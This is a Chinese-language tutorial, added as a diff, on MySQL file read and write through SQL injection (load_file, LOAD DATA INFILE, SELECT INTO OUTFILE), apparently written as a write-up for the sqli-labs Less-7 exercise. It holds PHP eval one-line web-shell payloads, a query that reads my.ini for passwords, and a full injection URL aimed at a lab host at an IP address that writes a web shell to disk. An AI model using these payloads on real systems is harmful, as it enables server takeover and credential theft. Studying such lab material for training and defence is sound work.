@@ -1,0 +1,84 @@
+写在前面：
+
+导入导出相关操作的讲解：
+1、load_file()导出文件
+Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。
+使用条件：
+A、必须有权限读取并且文件必须完全可读
+and (select count(*) from mysql.user)>0/* 如果结果返回正常,说明具有读写权限。
+and (select count(*) from mysql.user)>0/* 返回错误，应该是管理员给数据库帐户降权
+B、欲读取文件必须在服务器上
+C、必须指定文件完整的路径
+D、欲读取文件必须小于max_allowed_packet
+
+如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的
+就是权限，在windows 下，如果NTFS 设置得当，是不能读取相关的文件的，当遇到只有
+administrators 才能访问的文件，users 就别想load_file 出来。
+在实际的注入中，我们有两个难点需要解决：
+绝对物理路径
+构造有效的畸形语句（报错爆出绝对路径）
+在很多PHP 程序中，当提交一个错误的Query，如果display_errors = on，程序就会暴露
+WEB 目录的绝对路径，只要知道路径，那么对于一个可以注入的PHP 程序来说，整个服务器的安全将受到严重的威胁。
+MYSQL注入load_file常见路径：http://www.cnblogs.com/lcamry/p/5729087.html
+
+2、文件导入到数据库
+LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必
+须为一个文字字符串。
+在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据
+库的权限时，可以将系统文件利用load data infile 导入到数据库中。
+
+3、导入到文件
+SELECT.....INTO OUTFILE 'file_name'
+可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE
+权限，才能使用此语法。file_name 不能是一个已经存在的文件。
+我们一般有两种利用形式：
+第一种直接将select 内容导入到文件中：
+Select version() into outfile “c:\\phpnow\\htdocs\\test.php”
+此处将version()替换成一句话，<?php @eval($_post[“yulige”])?>也即
+Select <?php @eval($_post[“yulige”])?> into outfile “c:\\phpnow\\htdocs\\test.php”
+直接连接一句话就可以了，其实在select 内容中不仅仅是可以上传一句话的，也可以上传很
+多的内容。
+第二种修改文件结尾：
+Select version() Into outfile “c:\\phpnow\\htdocs\\test.php” LINES TERMINATED BY 0x16 进制文件
+解释：通常是用‘\r\n’结尾，此处我们修改为自己想要的任何文件。同时可以用FIELDS TERMINATED BY
+16 进制可以为一句话或者其他任何的代码，可自行构造。
+TIPS：
+（1）可能在文件路径当中要注意转义，这个要看具体的环境
+（2）上述我们提到了load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语
+句：
+select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile
+‘c:\\wamp\\www\\test.php’
+可以利用该语句将服务器当中的内容导入到web 服务器下的目录，这样就可以得到数据了。
+上述my.ini 当中存在password 项（不过默认被注释），当然会有很多的内容可以被导出来，
+这个要平时积累。
+
+参考文章：《MYSQL注入天书》
+
+2333333知识普及的差不多了，终于开始正题了吗？
+
+less-7
+
+1.获取网站在系统中的具体路径
+首先介绍两个可以说是函数，还是变量的东西
+@@datadir 读取数据库路径
+@@basedir MYSQL 获取安装路径
+
+然后进行注入爆出路径信息。
+
+这里的less-7我没注出来，但是在less-3注出了路径。
+
+/var/lib/mysql/
+/usr
+
+http://43.247.91.228:84/Less-7/?id=1')) union select 1,2,'<?php @eval($_POST["test"]);?>' into outfile '/tmp/123.php' --+ 
+
+之后拿菜刀连一下。
+
+less-7 over！
+
+ 
+
+
+
+
+
